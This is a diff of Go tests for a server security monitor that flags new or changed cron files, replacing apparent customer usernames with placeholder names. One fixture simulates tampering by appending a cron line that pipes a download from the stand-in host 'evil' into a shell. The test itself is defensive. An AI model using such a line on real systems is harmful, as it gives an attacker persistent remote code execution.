@@ -13,8 +13,8 @@ import (
 // A crontab CSM itself installed must not raise "new sensitive file appeared".
 func TestEvaluateSensitiveFileAppearance_SuppressesCSMSelfWrite(t *testing.T) {
 	resetSelfWrites(t)
-	path := "/var/spool/cron/aromedenarghile"
-	content := []byte("# CSM WP-Cron /home/aromedenarghile/public_html\n*/5 * * * * cd '/home/aromedenarghile/public_html' && '/usr/local/bin/php' wp-cron.php\n")
+	path := "/var/spool/cron/acmegarden"
+	content := []byte("# CSM WP-Cron /home/acmegarden/public_html\n*/5 * * * * cd '/home/acmegarden/public_html' && '/usr/local/bin/php' wp-cron.php\n")
 	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})
 
 	RecordSelfWrite(path, content)
@@ -39,7 +39,7 @@ func TestEvaluateSensitiveFileAppearance_FlagsUnrecordedCron(t *testing.T) {
 // still alarm -- suppression is content-bound, not a path allowlist.
 func TestEvaluateSensitiveFileAppearance_FlagsTamperedCSMCron(t *testing.T) {
 	resetSelfWrites(t)
-	path := "/var/spool/cron/aromedenarghile"
+	path := "/var/spool/cron/acmegarden"
 	clean := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
 	RecordSelfWrite(path, clean)
 
@@ -65,7 +65,7 @@ func TestEvaluateSensitiveFileAppearance_ReadErrorFailsSafe(t *testing.T) {
 // The realtime write path must also honor the self-write ledger.
 func TestEvaluateSensitiveFileWrite_SuppressesCSMSelfWrite(t *testing.T) {
 	resetSelfWrites(t)
-	path := "/var/spool/cron/baxiro"
+	path := "/var/spool/cron/acmeboiler"
 	content := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
 	RecordSelfWrite(path, content)
 	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return content, nil }})
@@ -77,7 +77,7 @@ func TestEvaluateSensitiveFileWrite_SuppressesCSMSelfWrite(t *testing.T) {
 
 func TestEvaluateSensitiveFileWrite_FlagsTamperedCSMSelfWrite(t *testing.T) {
 	resetSelfWrites(t)
-	path := "/var/spool/cron/baxiro"
+	path := "/var/spool/cron/acmeboiler"
 	clean := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
 	RecordSelfWrite(path, clean)
 	tampered := append(append([]byte{}, clean...), []byte("* * * * * curl http://evil/x | sh\n")...)
